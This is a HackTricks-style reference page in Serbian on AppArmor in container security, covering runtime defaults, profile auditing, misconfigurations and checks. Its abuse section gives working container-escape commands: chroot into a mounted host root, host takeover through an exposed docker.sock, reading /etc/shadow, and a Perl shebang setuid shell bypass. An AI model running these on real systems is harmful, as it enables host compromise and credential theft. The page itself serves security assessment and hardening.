# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Uloga u izolaciji kontejnera

AppArmor je sistem **Mandatory Access Control** koji primenjuje ograničenja putem profila za pojedinačne programe. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupa, AppArmor omogućava kernelu da primeni policy pridružen samom procesu. U container okruženjima ovo je važno zato što workload može imati dovoljno tradicionalnih privilegija da pokuša neku radnju, a da i dalje bude odbijen jer njegov AppArmor profil ne dozvoljava relevantnu putanju, mount, mrežno ponašanje ili upotrebu capability-ja.

Najvažnija konceptualna tačka je da je AppArmor **zasnovan na putanjama**. On razmatra pristup filesystemu kroz rules za putanje, a ne kroz labels, kao SELinux. Zbog toga je pristupačan i moćan, ali to takođe znači da bind mount-ovi i alternativni rasporedi putanja zahtevaju posebnu pažnju. Ako isti sadržaj sa hosta postane dostupan preko druge putanje, efekat policy-ja možda neće biti onakav kakav je operator prvobitno očekivao.

## Uloga u izolaciji kontejnera

Provere bezbednosti kontejnera često se zaustavljaju na capabilities i seccomp-u, ali AppArmor je i dalje važan nakon tih provera. Zamislite container koji ima više privilegija nego što bi trebalo, ili workload kojem je zbog operativnih razloga bila potrebna još jedna capability. AppArmor i dalje može ograničiti pristup fajlovima, ponašanje mount-a, networking i obrasce izvršavanja na načine koji zaustavljaju očigledan abuse path. Zato onemogućavanje AppArmor-a "samo da bi aplikacija radila" može neprimetno pretvoriti samo rizičnu konfiguraciju u onu koja je aktivno exploitable.

## Lab

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod kojim korisnikom trenutno radi proces kontejnera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U normalnom slučaju, proces treba da prikazuje AppArmor kontekst povezan sa profilom koji je runtime izabrao. U slučaju unconfined, taj dodatni sloj ograničenja nestaje.

Možete takođe proveriti šta Docker smatra da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Upotreba tokom izvršavanja

Docker može da primeni podrazumevani ili prilagođeni AppArmor profile kada ga host podržava. Podman takođe može da se integriše sa AppArmor-om na sistemima zasnovanim na AppArmor-u, iako na distribucijama koje prvenstveno koriste SELinux drugi MAC sistem često preuzima glavnu ulogu. Kubernetes može da izloži AppArmor policy na nivou workload-a na nodovima koji zaista podržavaju AppArmor. LXC i srodna Ubuntu-family okruženja za system-container takođe intenzivno koriste AppArmor.

Praktična poenta je da AppArmor nije "Docker feature". To je funkcionalnost host kernela koju više runtime-ova može izabrati da primeni. Ako ga host ne podržava ili je runtime podešen da radi kao unconfined, navodna zaštita zapravo ne postoji.

Konkretno za Kubernetes, moderni API je `securityContext.appArmorProfile`. Od Kubernetes verzije `v1.30`, starije beta AppArmor annotations su deprecated. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profile, dok `Localhost` pokazuje na profile koji već mora biti učitan na nodu. Ovo je važno tokom review-a, jer manifest može izgledati kao da podržava AppArmor, a da i dalje u potpunosti zavisi od podrške na nodu i unapred učitanih profila.<sup>[[1]](#references)</sup>

Jedan suptilan, ali koristan operativni detalj jeste da je eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` strože od jednostavnog izostavljanja ovog polja. Ako je polje eksplicitno postavljeno, a nod ne podržava AppArmor, admission bi trebalo da ne uspe. Ako je polje izostavljeno, workload i dalje može da se pokrene na nodu bez AppArmor-a i jednostavno neće dobiti taj dodatni sloj confinement-a. Iz ugla attackera, ovo je dobar razlog da proveri i manifest i stvarno stanje noda.<sup>[[1]](#references)</sup>

Na Docker-capable AppArmor hostovima, najpoznatiji podrazumevani profile je `docker-default`. Taj profile se generiše iz Moby AppArmor template-a i važan je zato što objašnjava zašto neki capability-based PoC-ovi i dalje ne uspevaju u podrazumevanom container-u. Uopšteno, `docker-default` dozvoljava uobičajeno networking ponašanje, zabranjuje upis u veliki deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da ne predstavlja opštu primitivu za ispitivanje hosta. Razumevanje te baseline konfiguracije pomaže da se razlikuje "container ima `CAP_SYS_ADMIN`" od "container zaista može da iskoristi tu capability protiv kernel interfejsa do kojih mi je stalo".

## Upravljanje profilima

AppArmor profili se obično čuvaju u `/etc/apparmor.d/`. Uobičajena konvencija imenovanja jeste zamena kosih crta u putanji izvršne datoteke tačkama. Na primer, profile za `/usr/bin/man` obično se čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je važan i tokom odbrane i tokom assessment-a, jer nakon što saznate naziv aktivnog profila, često možete brzo da pronađete odgovarajuću datoteku na hostu.

Korisne komande za upravljanje na strani hosta uključuju:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zbog kog su ove komande važne u referentnom materijalu o bezbednosti kontejnera jeste to što objašnjavaju kako se profili zaista kreiraju, učitavaju, prebacuju u complain mode i menjaju nakon izmena aplikacije. Ako operator ima naviku da tokom rešavanja problema prebacuje profile u complain mode i zaboravi da ponovo uključi enforcement, kontejner u dokumentaciji može izgledati zaštićeno, dok se u stvarnosti ponaša mnogo manje restriktivno.

### Kreiranje i ažuriranje profila

`aa-genprof` može da prati ponašanje aplikacije i pomogne u interaktivnom generisanju profila:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može da generiše predložak profila koji se kasnije može učitati pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i pravilo treba ažurirati, `aa-logprof` može ponovo obraditi odbijanja pronađena u logovima i pomoći operatoru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Logovi

AppArmor odbijanja su često vidljiva kroz `auditd`, syslog ili alate kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno u operativnom i ofanzivnom smislu. Defenders ga koriste za precizno podešavanje profila. Attackers ga koriste da saznaju koja se tačno putanja ili operacija odbija i da li je AppArmor kontrola koja blokira exploit chain.

### Identifikovanje Tačne Datoteke Profila

Kada runtime prikaže određeni naziv AppArmor profila za kontejner, često je korisno mapirati taj naziv nazad na datoteku profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je naročito korisno tokom provere na hostu, jer premošćava razliku između toga da „kontejner navodi da radi pod profilom `lowpriv`“ i toga da se „stvarna pravila nalaze u ovoj konkretnoj datoteci koja se može proveriti ili ponovo učitati“.

### Pravila koja treba posebno proveriti

Kada možete da pročitate profil, nemojte se zaustaviti samo na jednostavnim linijama `deny`. Nekoliko tipova pravila značajno menja koliko će AppArmor biti koristan protiv pokušaja bekstva iz kontejnera:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: izvršava ciljnu binarnu datoteku bez ograničenja. Ako je dostupnom pomoćnom programu, shell-u ili interpreteru dozvoljen `ux`, to je obično prvo što treba testirati.
- `px` / `Px` i `cx` / `Cx`: izvršavaju promene profila pri exec-u. Ovo nije automatski loše, ali vredi proveriti jer promena može dovesti do profila sa znatno širim ovlašćenjima od trenutnog.
- `change_profile`: omogućava task-u da pređe u drugi učitani profil, odmah ili pri sledećem exec-u. Ako je odredišni profil slabiji, ovo može postati predviđeni izlaz iz restriktivnog domena.
- `flags=(complain)`, `flags=(unconfined)`, ili noviji `flags=(prompt)`: ovo treba da utiče na nivo poverenja koji poklanjate profilu. `complain` beleži zabrane umesto da ih primenjuje, `unconfined` uklanja granicu, a `prompt` zavisi od odluke u userspace-u umesto od čistog deny mehanizma koji sprovodi kernel.
- `userns` ili `userns create,`: novije AppArmor policy pravilo može da kontroliše kreiranje user namespace-ova. Ako profil kontejnera to izričito dozvoljava, ugnježdeni user namespace-ovi i dalje predstavljaju mogućnost, čak i kada platforma koristi AppArmor kao deo svoje hardening strategije.

Korisni grep na hostu:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ova vrsta audita je često korisnija od pregledanja stotina uobičajenih pravila za datoteke. Ako breakout zavisi od izvršavanja pomoćnog programa, ulaska u novi namespace ili prelaska u manje restriktivan profil, odgovor se često krije u ovim pravilima usmerenim na tranzicije, a ne u očiglednim linijama poput `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori ga često postave tokom otklanjanja grešaka u aplikaciji koja nije radila zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako ova zastavica ostane u produkciji, ceo MAC sloj je praktično uklonjen.

Drugi suptilan problem je pretpostavka da su bind mounts bezopasni zato što dozvole nad datotekama izgledaju uobičajeno. Pošto je AppArmor zasnovan na putanjama, izlaganje host putanja pod alternativnim lokacijama za montiranje može loše da interaguje sa pravilima za putanje. Treća greška je zaboravljanje da ime profila u konfiguracionoj datoteci malo znači ako kernel hosta zapravo ne primenjuje AppArmor.

## Abuse

Kada AppArmor nije prisutan, operacije koje su ranije bile ograničene mogu iznenada proraditi: čitanje osetljivih putanja kroz bind mounts, pristup delovima procfs ili sysfs koji bi trebalo da ostanu teži za korišćenje, izvršavanje radnji povezanih sa montiranjem ako ih capabilities/seccomp takođe dozvoljavaju ili korišćenje putanja koje bi profil inače zabranio. AppArmor je često mehanizam koji objašnjava zašto pokušaj breakout-a zasnovan na capabilities „na papiru treba da radi“, ali u praksi ipak ne uspeva. Uklonite AppArmor i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavna prepreka lancu zloupotrebe zasnovanom na path-traversal, bind-mount ili mount tehnikama, prvi korak je obično poređenje onoga što postaje dostupno sa profilom i bez njega. Na primer, ako je host putanja montirana unutar kontejnera, počnite proverom da li možete da joj pristupite i čitate je:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova jeste da se proveri da li je AppArmor kontrola koja blokira operacije montiranja ili pristup osetljivim kernel datotečnim sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima u kojima je putanja hosta već dostupna putem bind mount-a, gubitak AppArmor-a takođe može pretvoriti problem otkrivanja informacija samo za čitanje u direktan pristup fajlovima hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije u tome da AppArmor sam po sebi omogućava breakout. Poenta je da, nakon uklanjanja AppArmor-a, brojni načini zloupotrebe filesystem-a i mount-ova odmah postaju dostupni za testiranje.

### Potpuni primer: AppArmor onemogućen + root host-a montiran

Ako je root host-a već bind-mount-ovan u kontejner na `/host`, uklanjanje AppArmor-a može blokirani filesystem abuse put pretvoriti u potpuni escape sa host-a:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host filesystem, workload je praktično izašao iz granica container-a:
```bash
id
hostname
cat /etc/shadow | head
```
### Kompletan primer: AppArmor Disabled + Runtime Socket

Ako je stvarna prepreka bio AppArmor koji štiti runtime state, montirani socket može biti dovoljan za potpuni escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačna putanja zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, a runtime API može da pokrene container koji kompromituje host.

### Potpun primer: Zaobilaženje bind-mount-a zasnovano na putanji

Pošto je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada mu je moguće pristupiti kroz drugu putanju:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno montirano i da li alternativna putanja takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najjasnijih razloga zbog kojih AppArmor treba procenjivati zajedno sa rasporedom mount tačaka, a ne izolovano.

### Potpuni primer: Shebang Bypass

AppArmor policy ponekad cilja putanju interpreter-a na način koji ne uzima u potpunosti u obzir izvršavanje skripte kroz obradu shebang-a. Istorijski primer obuhvatao je korišćenje skripte čiji prvi red pokazuje na ograničeni interpreter:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ovakav primer je važan kao podsetnik da se namera profila i semantika stvarnog izvršavanja mogu razlikovati. Prilikom pregleda AppArmor-a u container okruženjima, lancima interpreter-a i alternativnim putanjama izvršavanja treba posvetiti posebnu pažnju.

## Provere

Cilj ovih provera je da brzo odgovore na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Šta je ovde interesantno:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, workload nema koristi od AppArmor confinement-a.
- Ako `aa-status` prikazuje da je AppArmor onemogućen ili nije učitan, bilo koje ime profile-a u runtime konfiguraciji je uglavnom kozmetičko.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profile, to je često razlog zbog kog filesystem ili mount-based abuse path funkcioniše.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profile koji ste očekivali, runtime ili orchestrator konfiguracija sama po sebi nije dovoljna.
- Ako navodno hardened profile sadrži pravila u stilu `ux`, široki `change_profile`, `userns` ili `flags=(complain)`, praktična granica može biti mnogo slabija nego što ime profile-a sugeriše.

Ako container već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a omogućenim često pravi razliku između kontrolisanog izuzetka i mnogo šireg security failure-a.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućen na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profile, osim ako nije override-ovan | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor je podržan putem `--security-opt`, ali tačno podrazumevano ponašanje zavisi od hosta/runtime-a i manje je univerzalno od Docker-ovog dokumentovanog `docker-default` profile-a | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije naveden, podrazumevana vrednost je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na node-u | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profile-om, node-ovi bez AppArmor podrške |
| containerd / CRI-O under Kubernetes | Prati podršku node-a/runtime-a | Uobičajeni Kubernetes-podržani runtime-i podržavaju AppArmor, ali stvarno enforcement ponašanje i dalje zavisi od podrške node-a i workload postavki | Isto kao u Kubernetes redu; direktna runtime konfiguracija takođe može potpuno preskočiti AppArmor |

Kod AppArmor-a je najvažnija promenljiva često **host**, a ne samo runtime. Postavka profile-a u manifestu ne kreira confinement na node-u na kom AppArmor nije omogućen.

## Reference

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
